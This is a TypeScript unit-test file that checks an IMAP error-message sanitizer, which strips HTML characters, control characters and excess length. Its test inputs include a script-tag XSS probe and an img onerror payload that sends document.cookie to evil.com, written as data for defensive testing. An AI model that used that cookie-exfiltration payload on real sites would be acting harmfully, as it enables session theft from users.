/**
 * Unit tests for the IMAP error message sanitizer logic embedded in ImapEngine.testConnection().
 *
 * The sanitizer applies the regex:
 *   raw.replace(/[<>"'&]/g, '').replace(/[\r\n\0]/g, ' ').slice(0, 500)
 *
 * These tests exercise that logic in isolation via a pure helper so that no
 * real IMAP connection is required.  The helper mirrors the exact sanitizer
 * expression from imap.ts so any divergence will cause failures here first.
 */
import { describe, it, expect } from 'vitest';

/** Mirror of the sanitizer used in ImapEngine.testConnection catch block. */
function sanitizeImapError(raw: string): string {
    return raw.replace(/[<>"'&]/g, '').replace(/[\r\n\0]/g, ' ').slice(0, 500);
}

describe('IMAP error message sanitizer', () => {
    it('strips HTML angle-bracket tags to prevent reflected XSS in the UI', () => {
        const raw = 'Authentication failed: <script>alert(1)</script>';
        const result = sanitizeImapError(raw);
        expect(result).not.toContain('<');
        expect(result).not.toContain('>');
        expect(result).toBe('Authentication failed: scriptalert(1)/script');
    });

    it('strips double-quote, single-quote, and ampersand characters', () => {
        const raw = `Bad credentials: user="admin" & pass='secret'`;
        const result = sanitizeImapError(raw);
        expect(result).not.toMatch(/['"&]/);
        expect(result).toBe('Bad credentials: user=admin  pass=secret');
    });

    it('replaces carriage returns, newlines, and null bytes with spaces', () => {
        const raw = 'Line one\r\nLine two\nLine three\0End';
        const result = sanitizeImapError(raw);
        expect(result).not.toMatch(/[\r\n\0]/);
        expect(result).toBe('Line one  Line two Line three End');
    });

    it('truncates messages longer than 500 characters', () => {
        const raw = 'A'.repeat(600);
        const result = sanitizeImapError(raw);
        expect(result).toHaveLength(500);
    });

    it('preserves benign error messages unchanged', () => {
        const raw = 'Connection timed out (10s)';
        expect(sanitizeImapError(raw)).toBe('Connection timed out (10s)');
    });

    it('handles combined injection attempt: HTML + control chars + long payload', () => {
        const payload = `<img src=x onerror="fetch('//evil.com?c='+document.cookie)">\r\n` + 'X'.repeat(600);
        const result = sanitizeImapError(payload);
        expect(result).not.toContain('<');
        expect(result).not.toContain('>');
        expect(result).not.toMatch(/[\r\n\0]/);
        expect(result.length).toBeLessThanOrEqual(500);
    });

    it('returns empty string when given empty input', () => {
        expect(sanitizeImapError('')).toBe('');
    });
});
